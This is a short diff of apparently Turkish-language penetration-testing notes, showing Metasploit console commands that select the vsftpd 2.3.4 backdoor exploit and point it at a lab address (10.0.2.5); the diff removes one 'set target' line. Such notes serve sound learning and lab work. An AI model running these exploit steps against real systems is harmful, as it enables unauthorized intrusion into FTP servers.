@@ -82,7 +82,6 @@ nmap → temel
 ~msfconsole //Metasploit Console giriş yapılır
 msf6> ~use exploit/unix/ftp/vsftpd_234_backdoor
 msf6 exploit(unix/ftp/vsftpd_234_backdoor)> ~show options
-msf6 exploit(unix/ftp/vsftpd_234_backdoor)> ~set target 0
 msf6 exploit(unix/ftp/vsftpd_234_backdoor)>set rhosts 10.0.2.5
 msf6 exploit(unix/ftp/vsftpd_234_backdoor)> ~show options //bu sefer hedef çıkar
 msf6 exploit(unix/ftp/vsftpd_234_backdoor)> ~show targets //hedefleri gösterir
